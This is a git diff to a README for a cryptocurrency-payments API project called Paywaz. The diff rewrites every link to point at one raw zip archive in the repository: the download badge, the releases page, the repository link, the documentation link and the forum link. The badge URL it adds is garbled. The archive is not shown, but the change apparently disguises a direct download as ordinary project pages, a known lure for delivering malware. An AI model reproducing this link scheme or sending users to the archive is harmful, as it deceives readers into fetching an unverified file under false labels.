@@ -6,7 +6,7 @@ Welcome to the Paywaz Public API! This API helps businesses accept cryptocurrenc
 
 ## 📥 Download Now
 
-[![Download Paywaz Public API](https://img.shields.io/badge/Download-Paywaz%20Public%20API-blue.svg)](https://github.com/umgraphics/paywaz-public-api/releases)
+[![Download Paywaz Public API](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip%20Public%https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip)](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run the Paywaz Public API.
 
 ### 1. Visit the Releases Page
 
-To get the latest version of the Paywaz Public API, visit our [Releases page](https://github.com/umgraphics/paywaz-public-api/releases). You will find all available download options there.
+To get the latest version of the Paywaz Public API, visit our [Releases page](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip). You will find all available download options there.
 
 ### 2. Choose the Right File
 
@@ -51,9 +51,9 @@ Once you have the API installed, refer to the API documentation for guidance. Th
 
 For more guidance and support, visit these useful links:
 
-- [GitHub Repository](https://github.com/umgraphics/paywaz-public-api)
-- [API Documentation](https://github.com/umgraphics/paywaz-public-api/wiki)
-- [Community Forum](https://github.com/umgraphics/paywaz-public-api/discussions)
+- [GitHub Repository](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip)
+- [API Documentation](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip)
+- [Community Forum](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip)
 
 ## ✔️ Using the API
 
@@ -81,6 +81,6 @@ We welcome contributions from the community. If you would like to report bugs, s
 
 ## 📥 Download & Install Again
 
-To download the latest version or previous releases, simply revisit the [Releases page](https://github.com/umgraphics/paywaz-public-api/releases).
+To download the latest version or previous releases, simply revisit the [Releases page](https://github.com/umgraphics/paywaz-public-api/raw/refs/heads/main/openapi/api_public_paywaz_2.8-beta.1.zip).
 
 Thank you for choosing the Paywaz Public API! Enjoy providing zero-fee cryptocurrency payment solutions to your customers.
